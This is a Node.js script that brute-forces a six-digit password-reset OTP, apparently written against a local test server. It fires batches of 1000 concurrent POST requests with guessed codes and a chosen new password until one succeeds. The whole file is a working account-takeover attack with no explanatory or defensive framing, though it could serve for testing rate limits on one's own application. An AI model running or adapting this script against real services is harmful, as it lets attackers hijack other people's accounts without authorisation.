const axios = require('axios');

async function tryOtp(email, otp) {
    try {
        const response = await axios.post('http://localhost:3000/reset-password', {
            email: email,
            otp: otp,
            newPassword: 'newPassword123'
        });
        if (response.status === 200) {
            console.log(`Success with OTP: ${otp}`);
            return true; 
        }
        return false; 
    } catch (error) {
        console.log(`Failed OTP: ${otp}`, error.response ? error.response.data : error.message);
        return false; 
    }
}

async function bruteForceOtp(email, concurrency = 1000) {

    let otp = 100000;
    const maxOtp = 999999;

    const sendRequests = async () => {
        const batch = [];
        for (let i = 0; i < concurrency && otp <= maxOtp; i++, otp++) {
            batch.push(tryOtp(email, otp.toString()));
        }
        return Promise.all(batch);
    };

    while (otp <= maxOtp) {
        const newResults = await sendRequests();

        if (newResults.some(isSuccess => isSuccess)) {
            console.log('Correct OTP found, stopping further attempts.');
            break;
        }
    }

    if (otp > maxOtp) {
        console.log("No correct OTP found.");
    }
}

bruteForceOtp('test@example.com', 1000);  
